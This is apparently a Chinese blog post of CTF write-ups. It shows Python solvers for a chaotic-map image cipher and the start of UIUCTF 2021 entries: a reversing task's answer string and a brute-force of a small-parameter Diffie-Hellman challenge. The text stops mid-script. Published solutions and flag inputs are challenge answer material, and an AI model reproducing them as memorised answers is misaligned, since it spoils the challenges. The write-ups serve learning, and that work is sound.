<p>来自天命团队的密码师傅直接推导出来，从dp这个可以爆破点入手，求出了p，强。贴下<a href="https://mp.weixin.qq.com/s?__biz=Mzk0NzI0NTI2OA==&mid=2247485067&idx=1&sn=23d4b9fadcdec4db76ef46d07a684cad&chksm=c3789f30f40f1626f924f2a49ed00665bc9c5edc5bdbaa4baa6eefecb97c2a745e20c8469e8a&mpshare=1&scene=23&srcid=0801l9lK8AdmMIgwadJXiRw7&sharer_sharetime=1627828345543&sharer_shareid=18ef5175242004180f2ee4dd9c244e8a#rd">天命团队</a>链接</p>
<h3 id="Crypto-MedicalImage（recuring）"><a href="#Crypto-MedicalImage（recuring）" class="headerlink" title="Crypto-MedicalImage（recuring）"></a>Crypto-MedicalImage（recuring）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># It is based on logistic map in chaotic systems</span></span><br><span class="line">    <span class="comment"># The parameter r takes the largest legal value</span></span><br><span class="line">    <span class="keyword">assert</span>(x&gt;=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(x&lt;=<span class="number">1</span>)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># same as f1</span></span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># same as f1</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryptImage</span>(<span class="params">path</span>):</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(path)</span><br><span class="line">    size = im.size</span><br><span class="line">    pic  = np.array(im) </span><br><span class="line">    im.close()</span><br><span class="line">    r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">    r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">    r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">    w,h = size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        r1 = f1(r1)</span><br><span class="line">        r2 = f2(r2)</span><br><span class="line">        r3 = f3(r3)</span><br><span class="line">    const = <span class="number">10</span>**<span class="number">14</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r1))%w</span><br><span class="line">            y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r2))%h</span><br><span class="line">            r1 = f1(r1)</span><br><span class="line">            r2 = f2(r2)</span><br><span class="line">            tmp = pic[y,x]</span><br><span class="line">            pic[y,x] = pic[y1,x1]</span><br><span class="line">            pic[y1,x1] = tmp</span><br><span class="line">    p0 = random.randint(<span class="number">100</span>,<span class="number">104</span>)</span><br><span class="line">    c0 = random.randint(<span class="number">200</span>,<span class="number">204</span>)</span><br><span class="line">    config = (p0,c0)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            k = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r3))%<span class="number">256</span></span><br><span class="line">            k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            k = <span class="built_in">int</span>(k[p0%<span class="number">8</span>:]+k[:p0%<span class="number">8</span>],<span class="number">2</span>)</span><br><span class="line">            r3 = f3(r3)</span><br><span class="line">            p0 = pic[y,x]</span><br><span class="line">            c0 = k^((k+p0)%<span class="number">256</span>)^c0</span><br><span class="line">            pic[y,x] = c0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pic,size,config</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outputImage</span>(<span class="params">path,pic,size</span>):</span></span><br><span class="line">    im = Image.new(<span class="string">&#x27;P&#x27;</span>, size,<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    pixels = im.load()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">1</span>]):</span><br><span class="line">            pixels[i,j] = (<span class="built_in">int</span>(pic[j][i]))</span><br><span class="line"></span><br><span class="line">    im.save(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptImage</span>(<span class="params">pic,size,config</span>):</span></span><br><span class="line">    .....</span><br><span class="line">    </span><br><span class="line">enc_img = <span class="string">&#x27;flag.bmp&#x27;</span></span><br><span class="line">out_im = <span class="string">&#x27;flag_enc.bmp&#x27;</span></span><br><span class="line"></span><br><span class="line">pic,size,_ = encryptImage(enc_img)</span><br><span class="line">outputImage(out_im,pic,size)</span><br></pre></td></tr></table></figure>

<p>不知道为什么没有出来，找到混淆函数，然后加密和解密很类似，最后跑了6400张图片，没有解出来，等WP；所用的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line">enc_img = <span class="string">&#x27;flag.bmp&#x27;</span></span><br><span class="line">out_im = <span class="string">&#x27;flag_enc.bmp&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># It is based on logistic map in chaotic systems</span></span><br><span class="line">    <span class="comment"># The parameter r takes the largest legal value</span></span><br><span class="line">    x = <span class="number">4</span> * x * (<span class="number">1</span>-x)</span><br><span class="line">    <span class="keyword">assert</span>(x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(x &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outputImage</span>(<span class="params">path, pic, size</span>):</span></span><br><span class="line">    im = Image.new(<span class="string">&#x27;P&#x27;</span>, size, <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    pixels = im.load()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">1</span>]):</span><br><span class="line">            pixels[i, j] = (<span class="built_in">int</span>(pic[j][i]))</span><br><span class="line"></span><br><span class="line">    im.save(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptImage</span>(<span class="params">p1, config, p0x</span>):</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(out_im)</span><br><span class="line">    size = im.size</span><br><span class="line">    pic = np.array(im)</span><br><span class="line">    im.close()</span><br><span class="line">    r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">    r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">    r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">    w, h = size</span><br><span class="line">    rx1 = []</span><br><span class="line">    rx2 = []</span><br><span class="line">    rx3 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        r1 = f1(r1)</span><br><span class="line">        r2 = f1(r2)</span><br><span class="line">        r3 = f1(r3)</span><br><span class="line">        rx1.append(r1)</span><br><span class="line">        rx2.append(r2)</span><br><span class="line">        rx3.append(r3)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            r1 = f1(r1)</span><br><span class="line">            r2 = f1(r2)</span><br><span class="line">            r3 = f1(r3)</span><br><span class="line">            rx1.append(r1)</span><br><span class="line">            rx2.append(r2)</span><br><span class="line">            rx3.append(r3)</span><br><span class="line">    const = <span class="number">10</span> ** <span class="number">14</span></span><br><span class="line">    p0, c0 = config</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            k = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r3)) % <span class="number">256</span></span><br><span class="line">            k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            k = <span class="built_in">int</span>(k[p0 % <span class="number">8</span>:] + k[:p0 % <span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">            rx3.pop()</span><br><span class="line">            r3 = rx3[-<span class="number">1</span>]</span><br><span class="line">            p0 = p0x</span><br><span class="line">            c0 = k^((k+p0)%<span class="number">256</span>)^c0</span><br><span class="line">            pic[y, x] = c0</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r1)) % w</span><br><span class="line">            y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r2)) % h</span><br><span class="line">            rx1.pop()</span><br><span class="line">            rx2.pop()</span><br><span class="line">            r1 = rx1[-<span class="number">1</span>]</span><br><span class="line">            r2 = rx2[-<span class="number">1</span>]</span><br><span class="line">            tmp = pic[y, x]</span><br><span class="line">            pic[y, x] = pic[y1, x1]</span><br><span class="line">            pic[y1, x1] = tmp</span><br><span class="line">    outputImage(p1, pic, size)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> p0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">105</span>):</span><br><span class="line">    <span class="keyword">for</span> c0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>, <span class="number">205</span>):</span><br><span class="line">        <span class="keyword">for</span> p0xx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            decryptImage(<span class="built_in">str</span>(i)+<span class="string">&#x27;.bmp&#x27;</span>, (p0, c0), p0xx)</span><br><span class="line">            i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>看了来自天命团队的WP，还是逆算法的问题，想太简单了，以为加密即解密，稍微改一下就行</p>
<p>摆出re的态度，先cp下源码，自己重新写下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> (x &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span> * x * (<span class="number">1</span> - x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> (x &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span> * x * (<span class="number">1</span> - x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> (x &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span> * x * (<span class="number">1</span> - x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag_enc.bmp&#x27;</span>)</span><br><span class="line">size = im.size</span><br><span class="line">pic = np.array(im)</span><br><span class="line">im.close()</span><br><span class="line">r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">w, h = size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    r1 = f1(r1)</span><br><span class="line">    r2 = f2(r2)</span><br><span class="line">    r3 = f3(r3)</span><br><span class="line">const = <span class="number">10</span> ** <span class="number">14</span></span><br><span class="line">p = [<span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>]</span><br><span class="line">c = [<span class="number">200</span>, <span class="number">201</span>, <span class="number">202</span>, <span class="number">203</span>]</span><br><span class="line">R1, R2, R3 = r1, r2, r3</span><br><span class="line">l1 = []</span><br><span class="line">l2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(w * h):</span><br><span class="line">    l1.append(r1)</span><br><span class="line">    l2.append(r2)</span><br><span class="line">    r1 = f1(r1)</span><br><span class="line">    r2 = f2(r2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">p0, c0, r1=R1, r2=R2, r3=R3</span>):</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            k = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r3)) % <span class="number">256</span></span><br><span class="line">            k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            k = <span class="built_in">int</span>(k[p0 % <span class="number">8</span>:] + k[:p0 % <span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">            r3 = f3(r3)</span><br><span class="line">            pic[y, x] = ((pic[y, x] ^ c0 ^ k) - k) % <span class="number">256</span></span><br><span class="line">            p0 = pic[y, x]</span><br><span class="line">            c0 = k ^ ((k + p0) % <span class="number">256</span>) ^ c0</span><br><span class="line">    t = w * h - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const * l1[t])) % w</span><br><span class="line">            y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const * l2[t])) % h</span><br><span class="line">            tmp = pic[y, x]</span><br><span class="line">            pic[y, x] = pic[y1, x1]</span><br><span class="line">            pic[y1, x1] = tmp</span><br><span class="line">            t -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> pic, size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc_img = <span class="string">&#x27;flag.bmp&#x27;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> p0 <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">for</span> c0 <span class="keyword">in</span> c:</span><br><span class="line">        pic, size = decrypt(p0, c0)</span><br><span class="line">        im = Image.new(<span class="string">&#x27;P&#x27;</span>, size, <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        pixels = im.load()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">1</span>]):</span><br><span class="line">                pixels[i, j] = (<span class="built_in">int</span>(pic[j][i]))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        im.save(<span class="built_in">str</span>(count) + enc_img)</span><br></pre></td></tr></table></figure>

<p>好了，我开始复现惹。比赛中确实是草率了，很多点没有get到</p>
<p>好吧，我是废物，感觉都逆完了呀，但就是出不来；就瞄一眼师傅的，就一眼。emmmmm，卧槽！我怎么也想不到会死在这里</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210805191752700.png" alt="image-20210805191752700"></p>
<p>运算优先级，异或没有加括号，惹你了温，建议抄一百遍优先级表，<strong>位运算的优先级比加减要低</strong></p>
<p>顺带发现师傅只爆破了16种情况</p>
<p>然后卧法先万泉煤油宝破德碧瑶，因为我出来是25张flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210805192547584.png" alt="image-20210805192547584"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># It is based on logistic map in chaotic systems</span></span><br><span class="line">    <span class="comment"># The parameter r takes the largest legal value</span></span><br><span class="line">    <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> (x &lt;= <span class="number">1</span>)</span><br><span class="line">    x = <span class="number">4</span> * x * (<span class="number">1</span> - x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># same as f1</span></span><br><span class="line">    <span class="keyword">return</span> f1(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># same as f1</span></span><br><span class="line">    <span class="keyword">return</span> f1(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outputImage</span>(<span class="params">path, pic, size</span>):</span></span><br><span class="line">    im = Image.new(<span class="string">&#x27;P&#x27;</span>, size,<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    pixels = im.load()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">1</span>]):</span><br><span class="line">            pixels[i, j] = (<span class="built_in">int</span>(pic[j][i]))</span><br><span class="line">    im.save(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptImage</span>(<span class="params">path, p0c0</span>):</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(in_img)</span><br><span class="line">    size = im.size</span><br><span class="line">    pic = np.array(im)</span><br><span class="line">    im.close()</span><br><span class="line">    r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">    r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">    r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">    w, h = size</span><br><span class="line">    const = <span class="number">10</span> ** <span class="number">14</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        r1 = f1(r1)</span><br><span class="line">        r2 = f2(r2)</span><br><span class="line">        r3 = f3(r3)</span><br><span class="line">    r1_list, r2_list = [], []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(w * h):</span><br><span class="line">        r1_list.append(r1)</span><br><span class="line">        r2_list.append(r2)</span><br><span class="line">        r1 = f1(r1)</span><br><span class="line">        r2 = f2(r2)</span><br><span class="line">    p0 = p0c0[<span class="number">0</span>]</span><br><span class="line">    c0 = p0c0[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            k = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r3)) % <span class="number">256</span></span><br><span class="line">            k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            k = <span class="built_in">int</span>(k[p0 % <span class="number">8</span>:] + k[:p0 % <span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">            r3 = f3(r3)</span><br><span class="line">            pic[y, x] = ((pic[y, x] ^ c0 ^ k) - k) % <span class="number">256</span></span><br><span class="line">            c0 = k ^ ((k + pic[y, x]) % <span class="number">256</span>) ^ c0</span><br><span class="line">            p0 = pic[y, x]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r1_list.pop())) % w</span><br><span class="line">            y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r2_list.pop())) % h</span><br><span class="line">            pic[y, x], pic[y1, x1] = pic[y1, x1], pic[y, x]</span><br><span class="line">    outputImage(path, pic, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">in_img = <span class="string">&#x27;flag_enc.bmp&#x27;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">105</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>, <span class="number">205</span>):</span><br><span class="line">        decryptImage(<span class="built_in">str</span>(i)+<span class="string">&#x27;.bmp&#x27;</span>, (p, c))</span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="UIUCTF-2021"><a href="#UIUCTF-2021" class="headerlink" title="UIUCTF 2021"></a>UIUCTF 2021</h2><h3 id="Re-hvhpgs-synt"><a href="#Re-hvhpgs-synt" class="headerlink" title="Re-hvhpgs{synt}"></a>Re-hvhpgs{synt}</h3><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210731121038121.png" alt="image-20210731121038121"></p>
<p>首先看到最显眼的两串字符，词频一下可以出来有含义的字符，然后发现是rot和位移，直接手撕了，输入<code>i_propose_to_consider_the_question_can_machines_think</code>就可以得到flag</p>
<h3 id="Crypto-dhke-intro"><a href="#Crypto-dhke-intro" class="headerlink" title="Crypto-dhke_intro"></a>Crypto-dhke_intro</h3><p>题目提示</p>
<blockquote>
<p>Small numbers are bad in cryptography. This is why.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate key</span></span><br><span class="line">gpList = [ [<span class="number">13</span>, <span class="number">19</span>], [<span class="number">7</span>, <span class="number">17</span>], [<span class="number">3</span>, <span class="number">31</span>], [<span class="number">13</span>, <span class="number">19</span>], [<span class="number">17</span>, <span class="number">23</span>], [<span class="number">2</span>, <span class="number">29</span>] ]</span><br><span class="line">g, p = random.choice(gpList)</span><br><span class="line">a = random.randint(<span class="number">1</span>, p)</span><br><span class="line">b = random.randint(<span class="number">1</span>, p)</span><br><span class="line">k = <span class="built_in">pow</span>(g, a * b, p)</span><br><span class="line">k = <span class="built_in">str</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;Diffie-Hellman key exchange outputs&quot;)</span></span><br><span class="line"><span class="comment"># print(&quot;Public key: &quot;, g, p)</span></span><br><span class="line"><span class="comment"># print(&quot;Jotaro sends: &quot;, aNum)</span></span><br><span class="line"><span class="comment"># print(&quot;Dio sends: &quot;, bNum)</span></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pad key to 16 bytes (128bit)</span></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">padding = <span class="string">&quot;uiuctf2021uiuctf2021&quot;</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">16</span> - <span class="built_in">len</span>(key) != <span class="built_in">len</span>(k)):</span><br><span class="line">    key = key + padding[i]</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">key = key + k</span><br><span class="line">key = <span class="built_in">bytes</span>(key, encoding=<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">iv = <span class="built_in">bytes</span>(<span class="string">&quot;kono DIO daaaaaa&quot;</span>, encoding = <span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">ciphertext = cipher.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>看提示是要Diffie–Hellman密钥交换，但都可以爆破，注意下hex编码。抓住一名jo厨师傅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&#x27;b31699d587f7daf8f6b23b30cfee0edca5d6a3594cd53e1646b9e72de6fc44fe7ad40f0ea6&#x27;</span></span><br><span class="line">gpList = [[<span class="number">13</span>, <span class="number">19</span>], [<span class="number">7</span>, <span class="number">17</span>], [<span class="number">3</span>, <span class="number">31</span>], [<span class="number">13</span>, <span class="number">19</span>], [<span class="number">17</span>, <span class="number">23</span>], [<span class="number">2</span>, <span class="number">29</span>]]</span><br><span class="line">iv = <span class="built_in">bytes</span>(<span class="string">&quot;kono DIO daaaaaa&quot;</span>, encoding=<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> g, p <span class="keyword">in</span> gpList:</span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> <span 